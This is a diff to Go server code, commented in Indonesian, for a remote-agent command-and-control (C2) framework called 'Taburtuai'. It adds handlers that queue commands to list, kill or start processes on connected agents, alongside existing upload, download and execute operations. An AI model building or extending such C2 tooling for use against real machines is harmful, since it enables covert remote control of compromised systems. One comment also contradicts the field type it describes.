@@ -21,8 +21,8 @@ import (
 type Command struct {
 	ID          string            `json:"id"`
 	AgentID     string            `json:"agent_id"`
-	Command     string            `json:"command"` // Bisa "upload", "download", "execute", atau nama perintah spesifik
-	Args        []string          `json:"args,omitempty"`
+	Command     string            `json:"command"`        // Nama perintah utama, bisa juga nama internal seperti "internal_process_list"
+	Args        []string          `json:"args,omitempty"` // Untuk perintah 'execute' umum
 	WorkingDir  string            `json:"working_dir,omitempty"`
 	Timeout     int               `json:"timeout,omitempty"` // seconds
 	CreatedAt   time.Time         `json:"created_at"`
@@ -30,15 +30,24 @@ type Command struct {
 	CompletedAt time.Time         `json:"completed_at,omitempty"`
 	Status      string            `json:"status"` // pending, executing, completed, failed, timeout
 	ExitCode    int               `json:"exit_code,omitempty"`
-	Output      string            `json:"output,omitempty"`
+	Output      string            `json:"output,omitempty"` // Bisa output teks, atau JSON string (misal, daftar proses)
 	Error       string            `json:"error,omitempty"`
 	Metadata    map[string]string `json:"metadata,omitempty"`
 
-	OperationType   string `json:"operation_type,omitempty"`   // "upload", "download"
-	SourcePath      string `json:"source_path,omitempty"`      // Path file di agent (untuk download) atau di C2 (untuk upload ke agent)
-	DestinationPath string `json:"destination_path,omitempty"` // Path tujuan di agent (untuk upload) atau di C2 (untuk download dari agent)
-	FileContent     []byte `json:"file_content,omitempty"`     // Untuk mengirim konten file (upload ke agent) - ini akan dienkripsi oleh server
-	IsEncrypted     bool   `json:"is_encrypted,omitempty"`     // Menandakan apakah FileContent sudah dienkripsi (oleh server sebelum dikirim ke agent)
+	// --- Field Operasi Umum & File (OperationType diperbarui) ---
+	OperationType   string `json:"operation_type,omitempty"`   // "execute", "upload", "download", "process_list", "process_kill", "process_start"
+	SourcePath      string `json:"source_path,omitempty"`      // Untuk "download"
+	DestinationPath string `json:"destination_path,omitempty"` // Untuk "upload" (tujuan di agent) atau "download" (tujuan di server)
+	FileContent     []byte `json:"file_content,omitempty"`     // Untuk "upload" (konten file ke agent)
+	IsEncrypted     bool   `json:"is_encrypted,omitempty"`     // Menandakan apakah FileContent (untuk upload) atau Output (untuk download) dienkripsi antar server-agent
+
+	// --- BARU: Fields untuk Manajemen Proses ---
+	ProcessName string `json:"process_name,omitempty"` // Untuk "process_start" (opsional, bisa bagian dari ProcessPath) atau "process_kill" (berdasarkan nama)
+	ProcessID   int    `json:"process_id,omitempty"`   // Untuk "process_kill" (berdasarkan PID)
+	ProcessPath string `json:"process_path,omitempty"` // Path lengkap ke executable untuk "process_start"
+	ProcessArgs string `json:"process_args,omitempty"` // Argumen untuk "process_start" (sebagai slice of strings)
+	// Sebelumnya saya sarankan ProcessArgs string, tapi []string lebih fleksibel dan aman.
+	// Jika Anda tetap ingin string, agent perlu parsing.
 }
 
 // CommandQueue manages commands for agents
@@ -800,4 +809,128 @@ func startCommandQueueCleanup() {
 		}
 	}()
 	LogInfo(SYSTEM, "Command queue cleanup routine started. Old results will be cleaned periodically.", "") //
+}
+
+func (s *TaburtuaiServer) listProcesses(c *gin.Context) {
+	agentID := c.Param("id")
+	if _, exists := s.monitor.GetAgent(agentID); !exists { //
+		c.JSON(http.StatusNotFound, APIResponse{Success: false, Error: "Agent not found"})
+		return
+	}
+
+	cmd := &Command{
+		ID:            uuid.New().String(),
+		AgentID:       agentID,
+		Command:       "internal_process_list", // Perintah internal untuk agent
+		OperationType: "process_list",
+		CreatedAt:     time.Now(),
+		Status:        "pending",
+		Timeout:       60, // Timeout 60 detik untuk daftar proses
+	}
+	// Tambahkan ke antrian
+	commandQueue.mutex.Lock()
+	commandQueue.queues[agentID] = append(commandQueue.queues[agentID], cmd)
+	commandQueue.mutex.Unlock()
+
+	LogCommand(agentID, "LIST_PROCESSES", "Queued", true) //
+	c.JSON(http.StatusOK, APIResponse{Success: true, Message: "Process list command queued", Data: gin.H{"command_id": cmd.ID}})
+}
+
+func (s *TaburtuaiServer) killProcess(c *gin.Context) {
+	agentID := c.Param("id")
+	agent, exists := s.monitor.GetAgent(agentID) //
+	if !exists {
+		c.JSON(http.StatusNotFound, APIResponse{Success: false, Error: "Agent not found"})
+		return
+	}
+	if agent.Status != StatusOnline { //
+		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: fmt.Sprintf("Agent is %s, cannot send kill command", agent.Status)})
+		return
+	}
+
+	var req struct {
+		ProcessID   int    `json:"process_id"`
+		ProcessName string `json:"process_name"`
+	}
+
+	if err := c.ShouldBindJSON(&req); err != nil {
+		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: "Invalid request body: " + err.Error()})
+		return
+	}
+
+	if req.ProcessID == 0 && req.ProcessName == "" {
+		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: "Either process_id or process_name must be provided"})
+		return
+	}
+
+	targetLog := ""
+	if req.ProcessID != 0 {
+		targetLog = fmt.Sprintf("PID %d", req.ProcessID)
+	} else {
+		targetLog = fmt.Sprintf("Name '%s'", req.ProcessName)
+	}
+
+	cmd := &Command{
+		ID:            uuid.New().String(),
+		AgentID:       agentID,
+		Command:       fmt.Sprintf("internal_process_kill %s", targetLog),
+		OperationType: "process_kill",
+		ProcessID:     req.ProcessID,   //
+		ProcessName:   req.ProcessName, //
+		CreatedAt:     time.Now(),
+		Status:        "pending",
+		Timeout:       30, // Timeout 30 detik untuk kill
+	}
+
+	commandQueue.mutex.Lock()
+	commandQueue.queues[agentID] = append(commandQueue.queues[agentID], cmd)
+	commandQueue.mutex.Unlock()
+
+	LogCommand(agentID, fmt.Sprintf("KILL_PROCESS %s", targetLog), "Queued", true) //
+	c.JSON(http.StatusOK, APIResponse{Success: true, Message: "Process kill command queued for " + targetLog, Data: gin.H{"command_id": cmd.ID}})
+}
+
+// --- AKHIR BARU ---
+
+// --- BARU: Handler untuk startProcess ---
+func (s *TaburtuaiServer) startProcess(c *gin.Context) {
+	agentID := c.Param("id")
+	agent, exists := s.monitor.GetAgent(agentID) //
+	if !exists {
+		c.JSON(http.StatusNotFound, APIResponse{Success: false, Error: "Agent not found"})
+		return
+	}
+	if agent.Status != StatusOnline { //
+		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: fmt.Sprintf("Agent is %s, cannot send start command", agent.Status)})
+		return
+	}
+
+	var req struct {
+		ProcessPath string `json:"process_path" binding:"required"`
+		ProcessArgs string `json:"process_args"` // Opsional
+	}
+
+	if err := c.ShouldBindJSON(&req); err != nil {
+		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: "Invalid request body: " + err.Error()})
+		return
+	}
+
+	cmd := &Command{
+		ID:            uuid.New().String(),
+		AgentID:       agentID,
+		Command:       fmt.Sprintf("internal_process_start %s %s", req.ProcessPath, req.ProcessArgs),
+		OperationType: "process_start",
+		ProcessPath:   req.ProcessPath, //
+		ProcessArgs:   req.ProcessArgs, //
+		CreatedAt:     time.Now(),
+		Status:        "pending",
+		Timeout:       60, // Timeout 60 detik (proses mungkin berjalan lama, tapi perintah startnya sendiri cepat)
+	}
+
+	commandQueue.mutex.Lock()
+	commandQueue.queues[agentID] = append(commandQueue.queues[agentID], cmd)
+	commandQueue.mutex.Unlock()
+
+	LogCommand(agentID, fmt.Sprintf("START_PROCESS %s %s", req.ProcessPath, req.ProcessArgs), "Queued", true) //
+	c.JSON(http.StatusOK, APIResponse{Success: true, Message: "Process start command queued", Data: gin.H{"command_id": cmd.ID}})
 }
